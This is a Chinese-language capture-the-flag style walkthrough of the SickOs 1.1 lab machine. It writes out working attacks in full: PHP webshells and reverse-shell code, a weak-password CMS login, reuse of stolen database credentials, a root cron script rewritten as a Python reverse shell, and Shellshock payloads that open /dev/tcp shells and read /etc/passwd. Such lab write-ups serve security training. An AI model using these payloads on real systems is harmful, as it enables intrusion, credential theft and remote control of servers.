1、nmap扫描项目ip
nmap -sP 10.211.55.0/24
Nmap scan report for 10.211.55.39

发现项目iP：
10.211.55.39

2、nmap全端口枚举

nmap -sC -sV -A -T5 10.211.55.39

22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1
3128/tcp open   http-proxy Squid http proxy 3.1.19
8080/tcp closed http-proxy

开启了三个端口，8080端口是关闭状态，3128显示代理了http，那么访问得用squid进行访问。


3、代理设置

1）方法1：
FoxyProxy进行添加：
SickOs1.1
10.211.55.39
3128

2）方法2：火狐浏览器自带代理设置

4、访问页面http://10.211.55.39/   ---通过代理后可以正常访问

5、扫描器漏扫

由于挂了代理，那么怎么扫描呢？

nikto -h 10.211.55.39 -useproxy http://10.211.55.39:3128

+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Sat Dec  5 08:35:02 2015
发现了存在robots.txt文件信息！

+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).

发现header存在93e4r0-cve-2014-6278信息，可以利用shellshock的CVE-2014-6271进行攻击!

回顾项目九***，就利用了shellshock  env环境变量绕过ssh！！

----

6、robots.txt信息枚举
访问：
http://10.211.55.39/robots.txt

发现存在：/wolfcms

访问：http://10.211.55.39/wolfcms
发现这是Wolf CMS的框架站！

Wolf CMS 是一个轻量级的 CMS 系统,包含一组插件,支持每页定制,灵活的页面内容和可重用的片段。


7、文件上传分析

谷歌搜索：Wolf CMS 后台地址
参考文章：
https://cloud.tencent.com/developer/article/1047292

或者kali搜索：searchsploit Wolf CMS
php/webapps/38000.txt



知道后台地址为：/?/admin/login
访问：http://10.211.55.39/wolfcms/?/admin/login
存在弱口令：
admin/admin
成功登录！


回顾项目十的五种拿shell的方法，都可以适用到这里我放过来：
********************************************************
*****后面可以用项目八  四个方法进行拿shell
------------------------------------------------------
方法1：
反弹shell：
cp /usr/share/webshells/php/php-reverse-shell.php .   ----复制phpshell到本文件夹
python -m SimpleHTTPServer 8081   ----开启http服务
http://10.211.55.36/imfadministrator/uploads/bf12807d791f.gif?cmd=wget%20http://10.211.55.19:8081/php-reverse-shell.php
wget下载phpwebshell到uoload目录！

nc -vlp 1234
https://10.211.55.37:12380/blogblog/wp-content/uploads/php-reverse-shell.php  ----访问
成功获得反弹shell！
------------------
方法2：一句话get请求

<?php echo shell_exec($_GET['cmd']);?>

http://10.211.55.39/wolfcms/public/1.php?cmd=whoami  ---回显正常

一句话反弹！
nc -vlp 10.211.55.19
这时候就信息枚举即可！

------------------
方法3：
<?php
$sock=fsockopen('10.211.55.19',8888);
$descriptorspec=array(
0=>$sock,
1=>$sock,
2=>$sock
);
$process=proc_open('/bin/sh',$descriptorspec,$pipes);
proc_close($process);
echo phpinfo();
?>
------------------

python -c 'import pty; pty.spawn("/bin/bash")'
********************************************************

8、内网信息枚举

尝试后拿到了反弹shell开启内网信息枚举！

find / -name config* 2>/dev/null
cat /var/www/wolfcms/config.php
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');

1）发现数据库账号密码：
root
john@123

mysql -uroot -pjohn@123
未发现有用的信息！

2）发现新用户
cat /etc/passwd
sickos
su sickos
john@123    ---尝试枚举mysql枚举的密码登录成功！

sudo -l
User sickos may run the following commands on this host:
    (ALL : ALL) ALL

sudo su   ---获得root权限！


3）枚举存在connect.py
cd /etc    ---cron一般在该目录下
grep -rn connect.py /etc/cron*
/etc/cron.d/automate:2:* * * * * root /usr/bin/python /var/www/connect.py
每分钟执行一次！

root@SickOs:/etc/cron.d# ls -la /var/www/connect.py
-rwxrwxrwx 1 root root 109 Dec  5  2015 /var/www/connect.py
发现这是root权限运行，可以写入！
----
回顾项目四*****：
nc -tvlp 9977

nano进行编辑：
#!/usr/bin/python
def con():
	import socket, time,pty, os
	host='10.211.55.19'
	port=9966
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
	s.connect((host,port))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
con()
----
或者：os.system('cp /bin/bash /tmp/dayu1') 
或者创建root权限的账号密码都行！


------------
拓展小知识：

1）拓展shellshock

nikto发现：/cgi-bin/status
访问：10.211.55.39/cgi-bin/status

在利用Shellshock之前，需要了解漏洞是什么，以及它是如何工作的？

Shellshock - CVE-2014-6271和CVE-2014-6278 - 是在 Linux 发行版中常用的Bash命令shell 中发现的一个严重漏洞。该漏洞允许攻击者在受影响的系统上运行任意命令，使用CGI环境的Web服务器会受影响。

Shellshock漏洞：
https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=5ee60f4e-030f-4691-b5b4-dc3c9e3701d4&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments
CVE-2014-6271：https://www.cvedetails.com/cve/cve-2014-6271
cve-2014-6278：https://www.cvedetails.com/cve/cve-2014-6278
CGI环境变量：http://www.cgi101.com/book/ch3/text.html


项目九payload：
'() { :;}; cat /etc/passwd'
由于前面知道CGI的apache服务器最容易受到攻击，还无法进行burpsuite抓包，那么用curl进行测试！

一般来说Bash允许将shell函数导出到服务器上其他的bash实例中，是通过使用函数定义（ENV_VAR_FN）创建一个环境变量来完成的：
env ENV_VAR_FN=’() { <your function> };’  
ENV_VAR_FN是在bash实例中执行命令的函数！
所以攻击方法：env ENV_VAR_FN=’() { <your function> }; <attacker code here>’

payload：User-Agent: () { :;}; echo test dayu > /var/www/dayu1
意思是在http头部的User-Agent发送env环境变量进行测试！

curl -x http://10.211.55.39:3128 -H "User-Agent: () { :;}; echo test dayu > /var/www/dayu" http://10.211.55.39/cgi-bin/status

访问：http://10.211.55.39/dayu   ---就能看到test dayu信息！存在=


最终payload：
curl -x http://10.211.55.39:3128 -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/10.211.55.19/9999 0>&1" http://10.211.55.39/cgi-bin/status

/bin/bash -i >& /dev/tcp/10.211.55.19/9999 0>&1

-x  使用HTTP代理启动连接
-H  使用http头进行连接User-Agent
或者使用 --proxy    -----可以参考curl --help all
------------------------

2）dirb漏扫代理技巧

dirb http://10.211.55.39/ -p http://10.211.55.39:3128
参考：https://zhuanlan.zhihu.com/p/26549845
----
 -p <proxy[:port]> : Use this proxy. (Default port is 1080)
 -P <proxy_username:proxy_password> : Proxy Authentication.
----
--------------------
3）wget走代理执行命令下载

wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=yes -e http_proxy=10.211.55.39:3128 http://127.0.0.1/cgi-bin/status

-qO-   ---将信息文本输出
-U  --user-agent=代理
-e   ----运行命令，execute=命令

nc -vlp 9998
wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -i >& /dev/tcp/10.211.55.19/9998 0>&1" -e use_proxy=yes -e http_proxy=10.211.55.39:3128 http://127.0.0.1/cgi-bin/status
--------------------
4）kali自带脚本shellshock
searchsploit Shellshock
locate linux/remote/34900.py
cp /usr/share/exploitdb/exploits/linux/remote/34900.py .

python 34900.py payload=reverse rhost=10.211.55.39 lhost=10.211.55.19 lport=555 proxy=10.211.55.39:3128 pages=/cgi-bin/status/

--------------------

5）绕过waf：
https://github.com/dotcppfile/DAws

--------------------
6）代码审计
searchsploit Wolf CMS
php/webapps/36818.php

cat /usr/share/exploitdb/exploits/php/webapps/36818.php

---
$login = "login[username]={$user}&login[password]={$pass}&login[redirect]=/wolfcms/?/admin/";
$packet  = "POST {$path}/?/admin/login/login HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
---

find / -name cgi-bin 2>/dev/null   ---查找cgi-bin
cat /usr/lib/cgi-bin/status
----
#!/bin/bash

echo "Content-Type: application/json";
echo ""
echo '{ "uptime": "'`uptime`'", "kernel": "'`uname -a`'"} '
----
可看到uptime是时间输出，kernel和uanme -a 输出版本信息，在页面上，允许CGI在Content-Type头部！
















